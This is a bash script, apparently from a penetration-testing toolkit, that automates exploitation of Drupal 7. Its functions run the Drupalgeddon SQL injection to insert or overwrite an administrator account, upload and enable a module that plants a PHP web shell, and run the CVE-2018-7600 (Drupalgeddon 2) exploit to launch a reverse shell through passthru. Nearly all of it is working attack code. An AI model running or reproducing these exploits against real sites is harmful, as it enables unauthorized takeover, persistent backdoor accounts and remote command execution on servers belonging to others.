#!/bin/bash
SCRIPTDIR=$(dirname "${BASH_SOURCE[0]}")

init_drupal() {
    
    if [[ -z $target_url ]]; then
        target_url="http://$ip"
        echo "Target URL not set, defaulting to $target_url"
    fi
    if [[ -z $cookie_jar ]]; then
        cookie_jar="drupal_cookie.txt"
        echo "Cookie jar not set, defaulting to $cookie_jar"
    fi
    if [[ ! -z $use_burpsuite ]] && [[ $use_burpsuite == "true" ]]; then
        echo "Using Burp Suite for module upload request"
        proxy_option="--proxy localhost:8080"
    fi

    if [[ -z $drupal_version ]]; then
        drupal_version=7
        echo "No Drupal version provided, using default: $drupal_version"
    fi

}

create_drupal7_module() {
    if [[ -z $drupal_module_name ]]; then
        drupal_module_name="webshell"
        echo "No Drupal module name provided, using default: $drupal_module_name"
    fi
    if [[ ! -d "$drupal_module_name" ]]; then
        mkdir "$drupal_module_name"
    fi
    pushd "$drupal_module_name" > /dev/null || return 1
    create_php_web_shell
    touch "$drupal_module_name.module"
    echo "<IfModule mod_rewrite.c>" > .htaccess
    echo "RewriteEngine On" >> .htaccess
    echo "RewriteBase /" >> .htaccess
    echo "</IfModule>" >> .htaccess
    drupal_info_file="$drupal_module_name.info"
    echo "name = Webshell Module" > "$drupal_info_file"
    echo "description = A simple Drupal module that provides a web shell." >> "$drupal_info_file"
    echo "core = 7.x" >> "$drupal_info_file"
    popd > /dev/null || return 1
    tar -czvf "$drupal_module_name.tar.gz" "$drupal_module_name"

}

get_drupal7_hash() {
    local url="https://raw.githubusercontent.com/cvangysel/gitexd-drupalorg/refs/heads/master/drupalorg/drupalpass.py"
    if [[ ! -f drupalpass.py ]]; then
        wget $url
    fi
    if [[ -z "$password" ]]; then
        password="password"
        echo "No password provided, using default password: $password"
    fi
    sed -E 's/salt \+ password\)/\(salt \+ password\)\.encode\(\"utf-8\"\)\)/g' drupalpass.py > temp_drupalpass.py
    sed -E -i 's/hash_str \+ password\)\./hash_str \+ \(password\)\.encode\(\"utf-8\"\)\)\./g' temp_drupalpass.py
    sed -E -i 's/ord\((.*)\)/\1/g' temp_drupalpass.py
    stored_hash='$S$CTo9G7Lx28rzCfpn4WB2hUlknDKv6QTqHaf82WLbhPT2K5TzKzML'
    hashed_password=$(python -c "from temp_drupalpass import DrupalHash; print(DrupalHash(\"$stored_hash\", \"$password\").get_hash())" | cut -c 1-55)
    echo "$hashed_password"
}

get_drupal7_sql_update_admin() {
    if [[ -z "$username" ]]; then
        username="admin"
        echo "No username provided, using default username: $username"
    fi
    if [[ -z "$password" ]]; then
        password="admin"
        echo "No password provided, using default password: $password"
    fi
    hash=$(get_drupal7_hash)
    sql_cmd="UPDATE users SET name='$username', pass='$hash' WHERE uid='1';;  "   
}

get_drupal7_sql_add_admin() {
    if [[ -z "$username" ]]; then
        username="admin${RANDOM}"
        echo "No username provided, using default username: $username"
    fi
    if [[ -z "$password" ]]; then
        password="admin"
        echo "No password provided, using default password: $password"
    fi
    hash=$(get_drupal7_hash)
    sql_cmd="INSERT INTO users (uid, name, pass, status) SELECT MAX(uid) + 1, '$username', '$hash', 1 FROM users; "
    sql_cmd+="INSERT INTO users_roles (uid, rid) VALUES ((SELECT uid FROM users WHERE name='$username'), 3);;  "
    echo "$sql_cmd"
}

login_drupal() {
    echo "Logging into Drupal"
    init_drupal
    if [[ -z $target_url ]]; then
        target_url="http://$ip"
        echo "Target URL not set, defaulting to $target_url"
    fi
    local url="${target_url}/node?destination=node"
    if [[ -z $cookie_jar ]]; then
        cookie_jar="drupal_cookie.txt"
        echo "Cookie jar not set, defaulting to $cookie_jar"
    fi
    hidden_inputs=$(get_post_hidden_inputs "$url" "user-login-form" )
    if [[ -z $hidden_inputs ]]; then
        echo "No hidden inputs found, cannot proceed with login."
        return 1
    fi
    request=$(curl -s -c $cookie_jar -b $cookie_jar $url \
        -d "name=$username" \
        -d "pass=$password" \
        -d "form_id=user_login_block" \
        -d "op=Log+in" $proxy_option)

}


run_drupalgeddon1() {
    init_drupal
    if [[ -z $sql_cmd ]]; then
        get_drupal7_sql_add_admin
    fi
    echo "Using SQL command: $sql_cmd"
    sql_cmd="0 ;$sql_cmd;;  "
    sql_cmd=$(urlencode $sql_cmd)
    request=$(curl -s $target_url/node?destination=node \
        -d "name[$sql_cmd]=test3" \
        -d "name[0]=test" \
        -d "pass=test" \
        -d "test2=test" \
        -d "form_build_id=" \
        -d "form_id=user_login_block" \
        -d "op=Log+in" $proxy_option)
    login_drupal
    upload_drupal_module
    curl $target_url/sites/all/modules/$drupal_module_name/webshell.php
}

upload_drupal_module() {
    init_drupal
    create_drupal7_module
    local url="${target_url}/admin/modules/install"
    hidden_inputs=$(get_iis_hidden_inputs "$url" "update-manager-install-form")
    echo "Hidden inputs found on the module upload page: $hidden_inputs"
    if [[ -z $hidden_inputs ]]; then
        echo "No hidden inputs found for upload, cannot proceed with module upload."
        return 1
    fi
    # Uplpad the module
    request=$(curl -s -b $cookie_jar -c $cookie_jar $url \
        -F "files[project_upload]=@$drupal_module_name.tar.gz" \
        -F "op=Install" \
        $hidden_inputs $proxy_option)
    # Enable the module
    url="${target_url}/admin/modules"
    hidden_inputs=$(get_post_hidden_inputs "$url" "system-modules")
    echo "Hidden inputs found on the module management page: $hidden_inputs"
    if [[ -z $hidden_inputs ]]; then
        echo "No hidden inputs found for module management, cannot proceed with enabling the module."
        return 1
    fi
    request=$(curl -s -b $cookie_jar -c $cookie_jar $url \
        -d "modules[Other][$drupal_module_name][enable]=1" \
        -d "op=Save+configuration" \
        -d "$hidden_inputs" $proxy_option)
}

run_drupalgeddon2_drupal7() {
    init_drupal
    local url="$target_url/?q=user/password&$(urlencode "name[#post_render][]")=passthru&$(urlencode "name[#type]")=markup"
    if [[ -z $cmd ]]; then
        cmd=$(get_bash_reverse_shell)
    fi
    cmd=$(get_twostage_reverse_shell)
    cmd=$(urlencode "$cmd")
    url="$url&$(urlencode "name[#markup]")=$cmd"
    request=$(curl -s "$url" \
        -d "form_id=user_pass" \
        -d "_triggering_element_name=name" $proxy_option)
    form_build_id=$(echo "$request" | grep -oP 'name="form_build_id" value="\K[^"]+')
    if [[ -z "$form_build_id" ]]; then
        echo "Failed to extract form_build_id from the response."
        return 1
    fi
    echo "Extracted form_build_id: $form_build_id"
    url="$target_url/file/ajax/name/%23value/$form_build_id"
    curl "$url" \
        -d "form_build_id=$form_build_id" $proxy_option

}


run_drupalgeddon2() {
    if [[ -z $drupal_version ]]; then
        drupal_version=7
        echo "No Drupal version provided, using default: $drupal_version"
    fi
    if [[ $drupal_version == 7 ]]; then
        run_drupalgeddon2_drupal7
    else
        echo "Unsupported Drupal version: $drupal_version. Only Drupal 7 is supported in this script."
    fi
}

perform_cve_2018_7600() {
    run_drupalgeddon2
}